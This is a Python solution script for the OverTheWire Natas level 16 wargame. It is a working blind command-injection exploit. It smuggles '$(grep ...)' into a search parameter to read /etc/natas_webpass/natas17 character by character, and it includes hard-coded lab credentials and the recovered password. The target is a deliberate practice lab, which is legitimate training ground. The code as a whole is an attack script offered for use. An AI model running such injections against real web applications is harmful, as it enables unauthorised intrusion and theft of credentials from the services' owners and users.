import requests
import string

url = 'http://natas16.natas.labs.overthewire.org/?needle={}&submit=Search'
natas16_username = 'natas16'
natas16password = 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'
password_path = '/etc/natas_webpass/natas17'
word_from_dict = 'American' # a random word from the given dictionary

s = requests.Session() 
s.auth = (natas16_username, natas16password)

# the previous level passwords were composed of ascii letters(lowercase and uppercase) and digits
charset = string.digits + string.ascii_letters 
new_charset = ''
for char in charset:
    # check is the password contains this character
    my_input = f'{word_from_dict}$(grep {char} {password_path})'
    r = s.get(url.format(my_input))
    # if this character isn't in the passowrd, my grep command returns an empty string
    # and therefore word_from_dict is in the response text 
    #(because then the given grep command searches word_from_dict+'' in the dictionary)
    if word_from_dict not in r.text: 
        new_charset += char
print(repr(new_charset))


password = ''
while True:
    for char in new_charset:
        # in regex: ^ means start of the string
        my_input = f'{word_from_dict}$(grep ^{password+char} {password_path})'
        r = s.get(url.format(my_input))
        if word_from_dict not in r.text: 
            password += char
            print(len(password), password)
            break
    else:
        print('done')
        break


# password = '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw'